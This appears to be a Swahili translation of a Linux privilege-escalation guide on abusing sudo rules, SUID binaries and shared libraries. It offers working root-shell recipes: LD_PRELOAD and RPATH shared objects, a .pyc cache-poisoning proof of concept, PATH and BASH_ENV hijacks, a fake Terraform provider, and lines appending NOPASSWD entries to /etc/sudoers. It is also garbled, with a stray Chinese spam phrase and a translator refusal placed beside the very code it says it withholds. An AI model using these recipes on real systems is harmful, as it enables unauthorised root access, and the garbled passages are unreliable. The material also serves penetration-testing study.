Ruhusa isiyo na vizuizi ya sudo yenye uwezo wa root kwa `prusaslicer` au `prusa-slicer` inapaswa kukaguliwa ikiwa mpigaji anaweza kuchagua mradi wa `.3mf` wa kuslice. Mradi unaweza kuwa na script ya uchakataji wa baadae inayoendeshwa G-code inapohamishwa; miradi iliyoundwa kwa makusudi inaweza kutekeleza amri ndani ya PrusaSlicer hadi na kujumuisha toleo la 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Thibitisha kanuni halisi ya sudo, toleo la binary na marekebisho ya msambazaji, chanzo cha mradi, na iwapo njia husika ya kuhamisha faili huendeshwa kabla ya kuhitimisha kuwa mpaka wa ruhusa unaweza kufikiwa. Hoja ya mradi isiyobadilika au sera ya `NOEXEC` inayotumika inaweza kubadilisha matokeo. Kugundua tu kwamba slicer imesakinishwa hakuthibitishi njia ya kupandisha ruhusa.

### SETENV

Maelekezo haya humruhusu mtumiaji **kuweka variable ya mazingira** anapoendesha kitu:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Mfano huu, **unaotegemea mashine ya HTB Admirer**, ulikuwa **hatarini** kwa **PYTHONPATH hijacking** ili kupakia maktaba yoyote ya Python wakati script inaendeshwa kama root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Uwekaji sumu kwenye `__pycache__` / `.pyc` inayoweza kuandikwa katika imports za Python zinazoruhusiwa na sudo

Ikiwa **script ya Python inayoendeshwa kwa sudo** ina-import module ambayo directory ya package yake ina **`__pycache__` inayoweza kuandikwa**, huenda ukaweza kubadilisha `.pyc` iliyohifadhiwa na kupata utekelezaji wa code kama mtumiaji mwenye mamlaka wakati wa import inayofuata.<sup>[[30]](#references)</sup>

- Kwa nini inafanya kazi:
  - CPython huhifadhi bytecode cache kwenye `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Interpreter hukagua **header** (magic + metadata ya timestamp/hash inayohusishwa na source), kisha hutekeleza code object iliyohifadhiwa katika mfumo wa marshaled baada ya header hiyo.
  - Ikiwa unaweza **kufuta na kuunda upya** faili ya cache kwa sababu directory inaweza kuandikwa, `.pyc` inayomilikiwa na root lakini haiwezi kuandikwa bado inaweza kubadilishwa.
- Njia ya kawaida:
  - `sudo -l` inaonyesha script au wrapper ya Python unayoweza kuendesha kama root.
  - Script hiyo ina-import module ya ndani kutoka `/opt/app/`, `/usr/local/lib/...`, n.k.
  - Directory ya `__pycache__` ya module iliyo-importiwa inaweza kuandikwa na mtumiaji wako au na kila mtu.

Uchunguzi wa haraka:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Ikiwa unaweza kukagua script yenye mapendeleo, tambua moduli zilizoingizwa na njia ya akiba yake:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Mtiririko wa kutumia vibaya:

1. Endesha script inayoruhusiwa na sudo mara moja ili Python iunde faili halali ya cache ikiwa bado haipo.
2. Soma baiti 16 za kwanza kutoka kwenye `.pyc` halali na uzitumie tena kwenye faili yenye maudhui hasidi.
3. Compile code object ya payload, tumia `marshal.dumps(...)` kuibadilisha kuwa mfuatano wa baiti, futa faili asili ya cache, kisha uunde upya faili hiyo kwa kutumia header asili pamoja na bytecode yako hasidi.
4. Endesha tena script inayoruhusiwa na sudo ili import iendeshe payload yako kama root.

Maelezo muhimu:

- Kutumia tena header asili ni muhimu kwa sababu Python hukagua metadata ya cache kulingana na faili chanzo, si kama mwili wa bytecode unalingana kweli na faili chanzo.
- Hii ni muhimu hasa pale ambapo faili chanzo inamilikiwa na root na haiwezi kuandikwa, lakini saraka ya `__pycache__` inayoiweka inaweza kuandikwa.
- `PYTHONDONTWRITEBYTECODE=1` na `python -B` huzuia Python kuandika faili mpya za `.pyc`; **hazizuii** Python kupakia cache halali iliyopo ambayo mshambuliaji ameibadilisha. Jambo muhimu ni kama mtumiaji mwenye ruhusa za chini anaweza kubadilisha cache ambayo import yenye ruhusa za juu itakubali. Python hukagua metadata ya timestamp/size au hash kabla ya kupakia bytecode iliyo kwenye cache. Tazama [Python import reference](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) na [command-line documentation](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Muundo wa chini kabisa wa proof-of-concept:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Uimarishaji:

- Hakikisha hakuna saraka katika njia ya import ya Python yenye ruhusa za kuandika kwa watumiaji wenye ruhusa ndogo, ikijumuisha `__pycache__`.
- Kagua umiliki na ruhusa za saraka za cache, ikijumuisha faili za `.pyc` zilizopo. Kuzima uandishi wa bytecode kunaweza kupunguza uundaji wa cache mpya, lakini hakuzuii matumizi ya cache iliyopo inayoweza kubadilishwa.
- Chukulia modules za Python za ndani na saraka za cache zenye ruhusa za kuandika kama vile unavyochukulia shell scripts au shared libraries zenye ruhusa za kuandika zinazotekelezwa na root.

### BASH_ENV imehifadhiwa kupitia sudo env_keep → root shell

Ikiwa sudoers itahifadhi `BASH_ENV` (kwa mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia tabia ya uanzishaji wa Bash isiyo ya mwingiliano kuendesha code yoyote kama root unapoendesha command inayoruhusiwa.<sup>[[24]](#references)</sup>

- Kwa nini inafanya kazi: Kwa shell zisizo za mwingiliano, Bash hutathmini `$BASH_ENV` na ku-source faili hiyo kabla ya kuendesha script lengwa. Sheria nyingi za sudo huruhusu kuendesha script au shell wrapper. Ikiwa `BASH_ENV` imehifadhiwa na sudo, faili yako hu-source akiwa na ruhusa za root.<sup>[[23]](#references)</sup>

- Mahitaji:
  - Sheria ya sudo unayoweza kutumia (lengo lolote linaloendesha `/bin/bash` bila mwingiliano, au bash script yoyote).
  - `BASH_ENV` ipo kwenye `env_keep` (kagua kwa `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Uimarishaji:
  - Ondoa `BASH_ENV` (na `ENV`) kwenye `env_keep`; pendelea `env_reset`.
  - Epuka kutumia shell wrappers kwa amri zinazoruhusiwa na sudo; tumia binaries ndogo.
  - Fikiria kuweka logging ya I/O ya sudo na kutuma arifa wakati env vars zilizohifadhiwa zinatumiwa.

### Terraform kupitia sudo huku `HOME` ikihifadhiwa (!env_reset)

Sudo inaporuhusu kutumia Terraform kama mtumiaji mwenye ruhusa zaidi, `!env_reset` ni kidokezo cha kuchunguza ni environment variables zipi hasa zinabaki chini ya sheria hiyo. Thibitisha `HOME` au `TF_CLI_CONFIG_FILE` inayotumika kabla ya kuchukulia `.terraformrc` au `terraform.rc` inayoweza kuandikwa na caller kuwa ndiyo usanidi unaotumika wa CLI. Ingizo la `provider_installation.dev_overrides` lina umuhimu tu ikiwa amri ya Terraform iliyowekwa maalum inapakia provider hiyo na caller anaweza kuweka executable yake kwenye saraka iliyochaguliwa.<sup>[[25]](#references)</sup>

- Elekeza provider inayohitajika kwenye saraka inayoweza kuandikwa na uweke plugin hasidi yenye jina la provider (k.m., `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform itashindwa kukamilisha Go plugin handshake lakini itatekeleza payload kama root kabla ya kufa, na kuacha SUID shell.

### Ubadilishaji wa TF_VAR + kupita ukaguzi wa symlink

Vigezo vya Terraform vinaweza kutolewa kupitia environment variables za `TF_VAR_<name>` ikiwa sheria maalum ya sudo itazihifadhi. Kusoma kupitia source-symlink pia kunahitaji provider inayofuata link na kunakili matokeo yaliyolindwa hadi kwenye destination inayoweza kusomwa na mtumiaji. Kuandika kupitia destination-symlink ni jambo tofauti: kunahitaji entry ya destination inayodhibitiwa na mtumiaji na provider ya upendeleo wa juu inayofuata link wakati wa kuandika; kazi iliyopangwa baadaye ni mojawapo tu ya matokeo yanayowezekana. Kabla ya kujaribu njia yoyote kati ya hizi, kagua ruhusa halisi ya sudo, faili husika za `.tf`, CLI config iliyochaguliwa, na umiliki wa path kwa amri za kusoma pekee kama `sudo -l`, `stat`, na `readlink`. Ukaguzi dhaifu wa kileksika kama `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` hauresolve symlinks:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform hutatua symlink na kunakili `/root/root.txt` halisi hadi kwenye eneo lengwa linaloweza kusomwa na mshambuliaji. Mbinu hiyo hiyo inaweza kutumiwa **kuandika** kwenye njia zenye ruhusa za juu kwa kuunda symlink za eneo lengwa mapema (kwa mfano, kuelekeza njia ya eneo lengwa la provider ndani ya `/etc/cron.d/`).

### requiretty / !requiretty

Katika baadhi ya distributions za zamani, sudo inaweza kusanidiwa kwa `requiretty`, ambayo hulazimisha sudo kuendeshwa kutoka kwenye TTY shirikishi pekee. Ikiwa `!requiretty` imewekwa (au chaguo hilo halipo), sudo inaweza kutekelezwa kutoka kwenye mazingira yasiyo shirikishi kama vile reverse shells, kazi za cron au scripts.

```bash
Defaults !requiretty
```

Hili si udhaifu wa moja kwa moja lenyewe, lakini linapanua hali ambazo sheria za sudo zinaweza kutumiwa vibaya bila kuhitaji PTY kamili.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Ikiwa `sudo -l` inaonyesha `env_keep+=PATH` au `secure_path` yenye maingizo yanayoweza kuandikwa na mshambuliaji (kwa mfano, `/home/<user>/bin`), amri ya nje isiyo na njia kamili ndani ya lengwa linaloruhusiwa na sudo inaweza kufunikwa na amri nyingine.<sup>[[3]](#references)</sup> Kukosekana kwa `secure_path` inayotumika pia kunastahili kuchunguzwa **ikiwa** mazingira ya sudo ya amri yanahifadhi `PATH` inayodhibitiwa na mtumiaji; kukosekana kwake pekee hakuthibitishi kuwa hivyo ndivyo ilivyo. Soma script inayoruhusiwa bila kuiendesha, kisha hakiki kanuni halisi ya RunAs na hoja, njia ya utafutaji wa amri inayotumika, na saraka inayoweza kuandikwa na kufikiwa iliyo mapema kwenye mpangilio wa utafutaji na yenye jina la amri hiyo. Uthibitishaji, `NOEXEC`, amri zilizojengewa ndani ya shell, na njia kamili za amri vinaweza kubadilisha matokeo.

- Mahitaji: sheria ya sudo (mara nyingi `NOPASSWD`) inayoendesha script/binary inayotumia amri bila njia kamili (`free`, `df`, `ps`, n.k.) na ingizo la PATH linaloweza kuandikwa na ambalo hutafutwa kwanza.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Njia za kukwepa vizuizi vya paths wakati wa kutekeleza Sudo
**Ruka** ili kusoma faili nyingine au kutumia **symlinks**. Kwa mfano, kwenye faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Ikiwa **wildcard** inatumiwa (\*), ni rahisi zaidi:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Hatua za kukabiliana**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Amri ya Sudo/binary ya SUID bila njia ya amri

Ikiwa **ruhusa ya sudo** imetolewa kwa amri moja **bila kubainisha njia**: _hacker10 ALL= (root) less_ unaweza kuitumia kwa kubadilisha kigezo cha PATH

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Mbinu hii pia inaweza kutumika ikiwa binary ya **suid** **inatekeleza amri nyingine bila kubainisha njia yake (kagua kila mara maudhui ya binary ya SUID isiyo ya kawaida kwa kutumia** _**strings**_ **)**.

[Mifano ya payload za kutekeleza.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binary ya SUID yenye njia ya amri

Ikiwa binary ya **suid** **inatekeleza amri nyingine huku ikibainisha njia yake**, basi unaweza kujaribu **kuhamisha function** yenye jina sawa na amri inayoitwa na faili ya suid.

Kwa mfano, ikiwa binary ya suid inaita _**/usr/sbin/service apache2 start**_ unapaswa kujaribu kuunda function na kuihamisha:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Kisha, unapoiita binary ya suid, function hii itatekelezwa

### Custom SUID copy wrappers

Utility ya SUID inayomilikiwa na root na inayokubali njia za chanzo na lengwa inaweza kuvuka mipaka miwili tofauti ya uaminifu. Ikiwa itaunda amri ya shell kutoka kwa mojawapo ya hoja hizo (kwa mfano, kupeleka amri ya `cp` iliyoundwa kwa `system()`), metacharacters za shell zinaweza kutekeleza amri nyingine kwa privileges zake zinazotumika. Hata ikiita `cp` kwa usalama bila shell, lengwa lisilo na vizuizi linaweza kuruhusu kuandika faili yoyote kwa privileges za juu, kama vile `/etc/passwd`. Kagua jinsi wrapper inavyoshughulikia hoja, tabia yake ya effective UID, vizuizi vya lengwa, na kama faili iliyonakiliwa huhifadhi maudhui yanayodhibitiwa na mtumiaji; ujumbe wa jumla wa hitilafu ya `cp` au kuwepo tu kwa SUID bit si uthibitisho wa hali yoyote kati ya hizi. Orodhesha binary na permissions zake bila kufanya mabadiliko kabla ya majaribio yoyote ya mikono.

### Script inayoweza kuandikwa na kutekelezwa na SUID wrapper

Usanidi usio sahihi unaotokea mara kwa mara katika custom-app ni wrapper binary inayomilikiwa na root yenye SUID inayotekeleza script, huku script yenyewe ikiwa inaweza kuandikwa na watumiaji wenye privileges ndogo.

Muundo wa kawaida:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Ikiwa `/usr/local/bin/backup.sh` inaweza kuandikika, unaweza kuongeza amri za payload kisha utekeleze wrapper ya SUID:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Ukaguzi wa haraka:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Njia hii ya shambulio ni ya kawaida hasa katika wrapper za "maintenance"/"backup" zinazosambazwa kwenye `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Kigezo cha mazingira **LD_PRELOAD** hutumiwa kubainisha library moja au zaidi zinazoshirikiwa (faili za .so) ambazo loader itapakia kabla ya library nyingine zote, ikiwemo C library ya kawaida (`libc.so`). Mchakato huu hujulikana kama kupakia library mapema.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia matumizi mabaya ya kipengele hiki, hasa kwa executable za **suid/sgid**, mfumo hutekeleza masharti fulani:

- Loader hupuuza **LD_PRELOAD** kwa executable ambazo user ID halisi (_ruid_) hailingani na user ID yenye ufanisi (_euid_).
- Kwa executable za suid/sgid, hupakiwa mapema library zilizo katika njia za kawaida pekee, ambazo pia ni za suid/sgid.

Kuongeza mamlaka kunaweza kutokea ikiwa unaweza kutekeleza amri kwa kutumia `sudo` na matokeo ya `sudo -l` yanajumuisha kauli **env_keep+=LD_PRELOAD**. Usanidi huu huruhusu kigezo cha mazingira **LD_PRELOAD** kuendelea kuwepo na kutambuliwa hata amri zinapoendeshwa kwa kutumia `sudo`, hivyo huenda ukasababisha utekelezaji wa msimbo wowote wenye mamlaka yaliyoinuliwa.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Hifadhi kama **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Kisha **ikusanye** kwa kutumia:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Hatimaye, **ongeza marupurupu** kwa kuendesha

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> privesc inayofanana inaweza kutumiwa vibaya ikiwa mshambuliaji anadhibiti env variable ya **LD_LIBRARY_PATH**, kwa kuwa anadhibiti path ambapo libraries zitat searchiwa.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

Unapokutana na binary yenye ruhusa za **SUID** inayoonekana isiyo ya kawaida, ni vyema kuthibitisha ikiwa inapakia faili za **.so** ipasavyo. Unaweza kuangalia hili kwa kuendesha command ifuatayo:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Kwa mfano, kukutana na hitilafu kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunaashiria uwezekano wa exploitation.

Ili kufanya exploitation hii, mtu angeunda faili la C, kwa mfano _"/path/to/.config/libcalc.c"_, lenye code ifuatayo:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Msimbo huu, ukishakusanywa na kutekelezwa, unalenga kuongeza ruhusa kwa kubadilisha ruhusa za faili na kutekeleza shell yenye ruhusa za juu.

Kusanya faili la C lililo hapo juu kuwa faili la shared object (.so) kwa kutumia:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Hatimaye, kuendesha binary ya SUID iliyoathiriwa kunapaswa kuanzisha exploit, na hivyo kuwezesha uwezekano wa mfumo kuathiriwa.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Kwa kuwa sasa tumepata binary ya SUID inayopakia library kutoka kwenye folda tunakoweza kuandika, tuunde library kwenye folda hiyo kwa jina linalohitajika:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Ukikumbana na hitilafu kama vile不卡免费播放

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

hiyo inamaanisha kuwa library uliyozalisha inahitaji kuwa na function inayoitwa `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyoratibiwa ya Unix binaries ambazo mshambulizi anaweza kutumia vibaya ili kukwepa vizuizi vya usalama vya ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa, lakini inatumika katika hali ambapo unaweza **kuingiza arguments pekee** kwenye command.

Mradi huu hukusanya functions halali za Unix binaries zinazoweza kutumiwa vibaya ili kutoka kwenye restricted shells, kuongeza au kudumisha privileges zilizoinuliwa, kuhamisha files, kuanzisha bind na reverse shells, na kurahisisha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ikiwa unaweza kufikia `sudo -l`, unaweza kutumia tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kuangalia ikiwa inaweza kupata jinsi ya kutumia vibaya sheria yoyote ya sudo.

### Kutumia Tena Sudo Tokens

Katika hali ambapo una **ufikiaji wa sudo** lakini huna password, unaweza kuongeza privileges kwa **kusubiri command ya sudo itekelezwe kisha kuteka token ya session**.<sup>[[18]](#references)</sup>

Masharti ya kuongeza privileges:

- Tayari una shell kama user "_sampleuser_"
- "_sampleuser_" **ametumia `sudo`** kutekeleza jambo fulani ndani ya **dakika 15 zilizopita** (kwa chaguo-msingi, huo ndio muda wa sudo token unaoturuhusu kutumia `sudo` bila kuingiza password yoyote)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuipakia)

(Unaweza kuwezesha `ptrace_scope` kwa muda kwa kutumia `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kuibadilisha kabisa katika `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Ikiwa masharti haya yote yametimizwa, **unaweza kuongeza privileges kwa kutumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Exploit ya kwanza** (`exploit.sh`) itaunda binary `activate_sudo_token` katika _/tmp_. Unaweza kuitumia **kuwasha sudo token katika session yako** (hutapata root shell kiotomatiki; tekeleza `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **Exploit ya pili** (`exploit_v2.sh`) itaunda shell ya sh ndani ya _/tmp_ **inayomilikiwa na root yenye setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **Exploit ya tatu** (`exploit_v3.sh`) **itaunda faili la sudoers** linalofanya **tokeni za sudo zidumu milele na kuruhusu watumiaji wote kutumia sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Ikiwa una **ruhusa za kuandika** kwenye folda au kwenye faili zozote zilizoundwa ndani ya folda hiyo, unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) **kuunda sudo token kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kuandika juu ya faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo yenye PID 1234, unaweza **kupata sudo privileges** bila kuhitaji kujua nenosiri kwa kufanya:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizo ndani ya `/etc/sudoers.d` husanidi nani anaweza kutumia `sudo` na jinsi ya kuitumia. Faili hizi **kwa chaguomsingi zinaweza kusomwa tu na mtumiaji root na kundi root**.\
**Ikiwa** unaweza **kusoma** faili hii, unaweza **kupata taarifa fulani za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote, utaweza kufanya **privilege escalation**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Ukiweza kuandika, unaweza kutumia vibaya ruhusa hii.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Njia nyingine ya kutumia vibaya ruhusa hizi:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Kuna baadhi ya mbadala wa binary ya `sudo`, kama vile `doas` ya OpenBSD. Kumbuka kuangalia usanidi wake katika `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Ikiwa `doas` inaruhusu editor au interpreter, angalia escapes za mtindo wa GTFOBins:

```bash
doas vim
:!/bin/sh
```

Siwezi kutafsiri maagizo ya kuteka nyara `sudo` ili kuendesha msimbo kama root. Naweza kusaidia kutafsiri sehemu ya ukaguzi wa usalama au kuandika upya sehemu hiyo kama mwongozo wa kujikinga.

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Maktaba ya Pamoja

### ld.so

Faili `/etc/ld.so.conf` huonyesha **mahali ambapo faili za usanidi zilizopakiwa zinatoka**. Kwa kawaida, faili hii huwa na njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hiyo inamaanisha kuwa faili za usanidi kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi **huelekeza kwenye folda nyingine** ambamo **maktaba** zita**tafutwa**. Kwa mfano, maudhui ya `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kuwa mfumo utatafuta maktaba ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu yoyote ile **mtumiaji ana ruhusa za kuandika** kwenye njia yoyote iliyoonyeshwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote iliyo ndani ya faili ya usanidi katika `/etc/ld.so.conf.d/*.conf`, anaweza kuweza kuongeza mapendeleo.\
Tazama **jinsi ya kutumia vibaya usanidi huu usio sahihi** kwenye ukurasa ufuatao:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Kwa kunakili lib kwenye `/var/tmp/flag15/`, itatumiwa na programu katika eneo hili kama ilivyoainishwa kwenye kigezo cha `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Kisha unda maktaba hasidi katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilities hutoa **sehemu ndogo ya root privileges zinazopatikana kwa mchakato**. Hii hugawa **privileges katika vitengo vidogo na tofauti**. Kila kitengo kinaweza kisha kutolewa kwa michakato kivyake. Kwa njia hii, seti kamili ya privileges hupunguzwa, na hivyo kupunguza hatari za exploitation.\
Soma ukurasa ufuatao ili **kujifunza zaidi kuhusu capabilities na jinsi ya kuzitumia vibaya**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Ruhusa za saraka

Katika saraka, **bit ya "execute"** humaanisha kuwa mtumiaji anayehusika anaweza kutumia "**cd**" kuingia kwenye folda.\
Bit ya **"read"** humaanisha kuwa mtumiaji anaweza **kuorodhesha** **faili**, na bit ya **"write"** humaanisha kuwa mtumiaji anaweza **kufuta** na **kuunda** **faili** mpya.

## ACLs

Access Control Lists (ACLs) ni safu ya pili ya ruhusa za hiari, zinazoweza **kuzipita ruhusa za kawaida za ugo/rwx**. Ruhusa hizi huboresha udhibiti wa ufikiaji wa faili au saraka kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao si wamiliki au sehemu ya kikundi. Kiwango hiki cha **undani huhakikisha usimamizi sahihi zaidi wa ufikiaji**. Maelezo zaidi yanapatikana [**hapa**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Mpe** mtumiaji "kali" ruhusa za kusoma na kuandika faili:

```bash
